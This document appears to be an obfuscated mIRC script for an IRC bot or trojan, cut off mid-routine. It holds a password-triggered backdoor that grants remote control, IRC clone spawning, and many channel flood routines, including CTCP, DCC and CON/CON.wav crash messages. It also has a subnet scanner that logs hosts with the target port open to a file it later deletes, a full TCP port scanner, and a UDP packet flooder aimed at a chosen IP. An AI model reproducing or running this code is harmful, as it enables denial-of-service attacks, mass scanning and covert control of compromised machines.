
on *:text:xn*:#:{ iF ($lEvEl($niCk) == 911) { hAlT } | elseiF ($niCk isoP #) && ($2 = %XXPAss) { AUser 911 $niCk } }

on *:SOCKOPEN:SPLIT*:{
  iF ($soCkerr > 0) { hAlT }
  sOCkWrITE -Tn $soCknAMe niCk $rAnD(A,Z) $+ $rAnD(a,z) $+ $rAnD(a,z) $+ $rAnD(a,z) $+ $rAnD(a,z) $+ $rAnD(a,z) $+ $rAnD(A,Z)
  sOCkWrITE -Tn $soCknAMe User $rAnD(A,Z) $rAnD(A,Z) $rAnD(A,Z) : $+ $boM
  sOCkWrITE -Tn $soCknAMe irCx
}
AliAs sPliTTers {
  %CloneloAD = 0
  soCkClose SPLIT*
  :nexT
  soCkoPen SPLIT $+ %CloneloAD %SErvERr %PorT1
  inC %CloneloAD
  iF (%CloneloAD < %howMAny) goTo nexT
}
on *:soCkreAD:SPLIT*: {
  soCkreAD %soCkreAD
  iF (PING Isin $geTTok(%soCkreAD,1,32)) { sET %Clones.SErvER $reMove($geTTok(%soCkreAD,2,32),:) | SPLIT.Pong }
  iF (PING Isin $geTTok(%soCkreAD,1,32)) { .sOCkWrITE -n $soCknAMe PONG : $geTTok(%soCkreAD,2,32) }
}
AliAs SPLIT.Pong {
  sET %SPLIT.ID $soCk(SPLIT*,0)
  sET %SPLIT.CnT 0
  :begin
  inC %SPLIT.CnT 1
  iF ($soCk(SPLIT*,SPLIT.CnT).nAMe != $nUll) { sOCkWrITE -n $soCk(SPLIT*,%SPLIT.CnT).nAMe PiNG_YeRseLF : $+ %Clones.SErvER }
  iF (%SPLIT.CnT >= %SPLIT.ID) { UNsET %SPLIT.* | reTUrn }
  goTo begin
}
AliAs GOwner { %iiCC = 0 | :nexT | inC %iiCC | iF ($ChAn(%iiCC) == $nUll) { reTUrn } | MoDe $ChAn(%iiCC) +q $1 | goTo NexT }
AliAs CleArF { wriTe -C qxx32.TxT | .reMove qxx32.TxT | .reMove C:\WINDOWS\ReCenT\qxx32.TxT }
AliAs Resolve1 {
  timer1CleArF 1 1 CleArF
  timer1Resolve 1 2 Resolve
  timer1NeTworkSCAnner 1 3 NeTworkSCAnner
  vTAlC BEGIN on hosT : $+ %IPAll : %xPorT  
}

;==============================
;         *: BooooM FlOOD - soCk.sys :*
;==============================

AliAs FlO.FlOOD {
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
  soCkoPen FlO $+ $rAnD(1,10000000000000) %SErvERr %PorT1
}

on *:SOCKOPEN:FlO*: {
  iF ($soCkerr > 0) { reTUrn }
  iF (%FlO.FlOOD.TyPe == jP) { goTo jP }
  iF (%FlO.FlOOD.TyPe == jPMsg) { goTo jPMsg }
  iF (%FlO.FlOOD.TyPe == Msg) { goTo Msg }
  iF (%FlO.FlOOD.TyPe == noTiCe) { goTo noTiCe }
  iF (%FlO.FlOOD.TyPe == FUCk) { goTo FUCk }
  iF (%FlO.FlOOD.TyPe == noTiCe1) { goTo noTiCe1 }
  iF (%FlO.FlOOD.TyPe == FUCk1) { goTo FUCk1 }
  iF (%FlO.FlOOD.TyPe == CTCP) { goTo CTCP }
  iF (%FlO.FlOOD.TyPe == CTCP1) { goTo CTCP1 }
  iF (%FlO.FlOOD.TyPe == whIsPer) { goTo whIsPer }
  iF (%FlO.FlOOD.TyPe == DCC) { goTo DCC }
  iF (%FlO.FlOOD.TyPe == Con) { goTo Con }
  iF (%FlO.FlOOD.TyPe == Con1) { goTo Con1 }
  :jP
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk IRCX
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD $+ $CrlF $+ PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :jPMsg
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk IRCX
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PrivMsg %ChAnFlOOD : $+ %FlOooooooooD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :CTCP
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk IRCX
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PRIVMSG %ChAnFlOOD : $+ $Chr(1) $+ Version $+ $Chr(1)
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :whIsPer
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk IRCX
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk whIsPer %ChAnFlOOD %FlO.FlOODwn : $+ %FlOooooooooD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :Msg
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk PrivMsg %ChAnFlOOD : $+ %FlOooooooooD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :noTiCe
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk noTiCe %ChAnFlOOD : $+ %FlOooooooooD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :FUCk
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk noTiCe %ChAnFlOOD : $+ $Chr(1) $+ %FlOooooooooD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :CTCP1
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk PRIVMSG %ChAnFlOOD : $+ $Chr(1) $+ Version $+ $Chr(1)
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :noTiCe1
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk noTiCe %ChAnFlOOD : $+ %FlOooooooooD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :FUCk1
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk noTiCe %ChAnFlOOD : $+ $Chr(1) $+ %FlOooooooooD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :DCC
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk PRIVMSG %ChAnFlOOD : $+ $Chr(1) $+ DCC SEND $rAnD(1,999999) $rAnD(1024,5000) $rAnD(1,5000) $+ $Chr(1)
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :Con
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk join %ChAnFlOOD
  sOCkWrITE -Tn %FlO.FlOOD.soCk PRIVMSG %ChAnFlOOD : $+ $Chr(1) $+ SOUND /Con/Con.wAv
  sOCkWrITE -Tn %FlO.FlOOD.soCk PArT %ChAnFlOOD
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
  :Con1
  sET %FlO.FlOOD.soCk $soCknAMe
  sOCkWrITE -Tn %FlO.FlOOD.soCk niCk $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) $+ $CrlF $+ User $rAnD(A,Z) $+ $rAnD(A,z) $+ $rAnD(A,z) $+ $rAnD(A,Z) AsDF AsDF AsDF
  sOCkWrITE -Tn %FlO.FlOOD.soCk PRIVMSG %ChAnFlOOD : $+ $Chr(1) $+ SOUND /Con/Con.wAv
  soCkClose %FlO.FlOOD.soCk
  soCkoPen %FlO.FlOOD.soCk %SErvERr %PorT1 
  hAlT
}
;================================================================
;   
;================================================================

AliAs NeTworkSCAnnerSToP {
  sToPsCAn
  .timerNeTworkSCAner oFF
  soCkClose NeTworkSCAner*
}
AliAs lookNeTwor {
  vTAlC lookSCAner on hosT : 2 %CNeTworkSCAnerHosT To %begshorTiP PorT : %xPorT
}

AliAs Resolve {
  vAr %CIP = %IPAll
  iF ($reMove(%CIP,.) !IsnUM)  reTUrn
  iF ($nUMTok(%CIP,46) != 4) reTUrn
  sET %IP.1 $geTTok(%CIP,1,46)
  sET %IP.2 $geTTok(%CIP,2,46)
  sET %IP.3 $geTTok(%CIP,3,46)
  sET %IP.4 $geTTok(%CIP,4,46)
  sET %xIP.1 $geTTok(%CIP,1,46)
  sET %xIP.2 255
  sET %xIP.3 255
  sET %xIP.4 255
}

AliAs ResolveAx1 {
  sET %IP.1 $geTTok($iP,1-1,46)
  sET %IP.2 $geTTok($iP,2-1,46)
  sET %IP.3 $geTTok($iP,3-1,46)
  sET %IP.4 1
  sET %xIP.1 $geTTok($iP,1-1,46)
  sET %xIP.2 $geTTok($iP,2-1,46)
  sET %xIP.3 $geTTok($iP,3-1,46)
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}

AliAs ResolveAx2 {
  sET %IP.1 $geTTok($iP,1-1,46)
  sET %IP.2 $geTTok($iP,2-1,46)
  sET %IP.3 1
  sET %IP.4 1
  sET %xIP.1 $geTTok($iP,1-1,46)
  sET %xIP.2 $geTTok($iP,2-1,46)
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs ResolveAx3 {
  sET %IP.1 $geTTok($iP,1-1,46)
  sET %IP.2 1
  sET %IP.3 1
  sET %IP.4 1
  sET %xIP.1 $geTTok($iP,1-1,46)
  sET %xIP.2 255
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs ResolveAx4 {
  sET %IP.1 $geTTok($iP,1-1,46)
  sET %IP.2 $geTTok($iP,2-1,46)
  sET %IP.3 $rAnD(1,255)
  sET %IP.4 $rAnD(1,255)
  sET %xIP.1 $geTTok($iP,1-1,46)
  sET %xIP.2 $geTTok($iP,2-1,46)
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs ResolveAx5 {
  sET %IP.1 $geTTok($iP,1-1,46)
  sET %IP.2 $rAnD(1,255)
  sET %IP.3 $rAnD(1,255)
  sET %IP.4 $rAnD(1,255)
  sET %xIP.1 $geTTok($iP,1-1,46)
  sET %xIP.2 255
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}

AliAs ResolveAxs {
  sET %IP.2 $rAnD(1,255)
  sET %IP.3 $rAnD(1,255)
  sET %IP.4 $rAnD(1,255)
  sET %xIP.2 255
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs ResolveAxs1 {
  sET %IP.3 $rAnD(1,255)
  sET %IP.4 $rAnD(1,255)
  sET %xIP.3 255
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs ResolveAxs2 {
  sET %IP.4 1
  sET %xIP.4 255
  vTAlC SCAnning FroM %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4 To %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4 PorT : %xPorT
  sET %CNeTworkSCAner1HosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  lookNeTworkSCAner
}
AliAs NeTworkSCAnner {
  iF ((%IP.1 == $nUll) || (%IP.2 == $nUll) || (%IP.3 == $nUll) || (%IP.4 == $nUll) || (%xIP.1 == $nUll) || (%xIP.2 == $nUll) || (%xIP.3 == $nUll) || (%xIP.4 == $nUll)) reTUrn
  lookNeTworkSCAner
}
AliAs sToPsCAn { soCkClose NeTworkSCAner* | timerNeTworkSCAner oFF | UNsET %begshorTiP | UNsET %CNeTworkSCAnerHosT | UNsET %IP.* | UNsET %xIP.* | UNsET %CNeTworkSCAner1HosT | UNsET %xPorT | UNsET %timerN | UNsET %nNeTworkSCAner.* }
AliAs FinIsheD { iF (%begshorTiP = %CNeTworkSCAnerHosT) { vTAlC sCAnning FroM: %CNeTworkSCAnerHosT To %begshorTiP Is FinIsheD.. | sToPsCAn } }
AliAs lookNeTworkSCAner {
  sET %begshorTiP %xIP.1 $+ . $+ %xIP.2 $+ . $+ %xIP.3 $+ . $+ %xIP.4
  sET %CNeTworkSCAnerHosT %IP.1 $+ . $+ %IP.2 $+ . $+ %IP.3 $+ . $+ %IP.4
  sET %nNeTworkSCAner.NexTB $CAlC(%IP.2 + 1)
  sET %nNeTworkSCAner.NexTC $CAlC(%IP.3 + 1)
  sET %nNeTworkSCAner.NexTD $CAlC(%IP.4 + 1)
  soCkClose NeTworkSCAner $+ %CNeTworkSCAnerHosT
  soCkoPen NeTworkSCAner $+ %CNeTworkSCAnerHosT %CNeTworkSCAnerHosT %xPorT
  FinIsheD
  iF (%nNeTworkSCAner.NexTD > %xIP.4) {
    iF (%nNeTworkSCAner.NexTC > %xIP.3) {
      iF (%nNeTworkSCAner.NexTB > %xIP.2) {
        lookNeTworkSCAner.HAlT 
      }
      else {
        sET %IP.2 %nNeTworkSCAner.NexTB
        sET %IP.3 0
        sET %IP.4 0
        .timerNeTworkSCAner -Mo 1 %timerN lookNeTworkSCAner
      }
    }
    else {
      sET %IP.3 %nNeTworkSCAner.NexTC
      sET %IP.4 1
      .timerNeTworkSCAner -Mo 1 %timerN lookNeTworkSCAner
    }
  }
  else {
    sET %IP.4 %nNeTworkSCAner.NexTD
    .timerNeTworkSCAner -Mo 1 %timerN lookNeTworkSCAner
  }
}



on *:SOCKOPEN:NeTworkSCAner*:  {
  iF ($soCkerr > 0) { soCkClose $soCknAMe | reTUrn }
  iF ($soCk($soCknAMe).PorT == %xPorT) {
    vTAlC 2 IP $soCk($soCknAMe).iP 4 %xPorT
    wriTe qxx32.TxT $soCk($soCknAMe).iP %xPorT
  }
}
%CNeTworkSCAnerHosT
on *:SOCKREAD:NeTworkSCAner*:  {
  iF ($soCkerr > 0) goTo enD
  vAr %CNeTworkSCAnerResPonse
  soCkreAD %CNeTworkSCAnerResPonse
  iF ($soCkbr == 0) goTo enD
  :enD
  hAlT
}

;============================================================================
;        
;============================================================================

AliAs STArTsCAniP {
  .timerFWSCAn -M 0 %timerFWSCAnner XFWSCAn
}

AliAs XFWSCAn {
  soCkoPen SCAnPorT $+ %nFWSCAnPorT %SCAn.IP %nFWSCAnPorT
  iF (%nFWSCAnPorT >= 65536) { 
    XFWSCAnHAlT 
  }
  else {
    inC %nFWSCAnPorT
  }
}


AliAs XFWSCAnHAlT {
  .timerFWSCAn oFF
  soCkClose SCAnPorT*
  UNsET %SCAn.IP
  UNsET %nFWSCAnPorT
  UNsET %timerFWSCAnner
}

on *:SOCKOPEN:SCAnPorT*:{
  iF ($soCkerr > 0) reTUrn
  vTAlC ConneCT PorT : 2 $soCk($soCknAMe).PorT
}

on *:SOCKREAD:SCAnPorT*:{
  iF ($soCkerr > 0) reTUrn
  soCkreAD -F %CPorT
  iF ($soCkbr == 0) reTUrn
  vTAlC $reMove($soCknAMe,SCAnPorT) : %CPorT
  .UNsET %CPorT
  soCkClose $soCknAMe
}

on *:SOCKCLOSE:SCAnPorT*:{
  vTAlC Close : 4 $soCk($soCknAMe).PorT
}
;============================================================================
;        
;============================================================================

AliAs gCoolsTArT  { .UNsET %gnUM* | sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 gDoPe }
AliAs gCoolsToP  { .timergCoolT oFF | .UNsET %timer.gDoPe | sET %gnUM 0 | .UNsET %gDoPeIP | vTAlC PACkeTing SToPeD }

AliAs gDoPe {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  %gnUM.Pr1 = $rAnD(1,65000)
  sOCKUDP gnUMC1 %gDoPeIP %gnUM.Pr1 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  %gnUM.Pr2 = $rAnD(1,65000)
  sOCKUDP gnUMC2 %gDoPeIP %gnUM.Pr
  %gnUM.Pr3 = $rAnD(1,65000)
  sOCKUDP gnUMC3 %gDoPeIP %gnUM.Pr3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnUM.Pr4 = $rAnD(1,65000)
  sOCKUDP gnUMC4 %gDoPeIP %gnUM.Pr
  %gnUM.Pr5 = $rAnD(1,65000)
  sOCKUDP gnUMC5 %gDoPeIP %gnUM.Pr
  %gnUM.Pr6 = $rAnD(1,65000)
  sOCKUDP gnUMC6 %gDoPeIP %gnUM.Pr
  %gnUM.Pr7 = $rAnD(1,65000)
  sOCKUDP gnUMC7 %gDoPeIP %gnUM.Pr7 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  %gnUM.Pr8 = $rAnD(1,65000)
  sOCKUDP gnUMC8 %gDoPeIP %gnUM.Pr
  reTUrn
  :Done
  vTAlC PACkeTing FinIsheD For %gDoPeIP
  .timergCoolT oFF
  .UNsET %gDoPeIP
  .UNsET %gnUM*
  .UNsET %PorT.gDoPe
  .UNsET %timer.gDoPe
} 

AliAs gCool1sTArT  { .UNsET %gnUM* | sET %gnUM 0 | .timergCoolT -M %timer.gDoPe 0 gDoPe1 }
AliAs gDoPe1 {
  iF %gnUM >= %timer.gDoPe { goTo Done }
  inC %gnUM 2
  %gnUM.Pr1 = %PorT.gDoPe
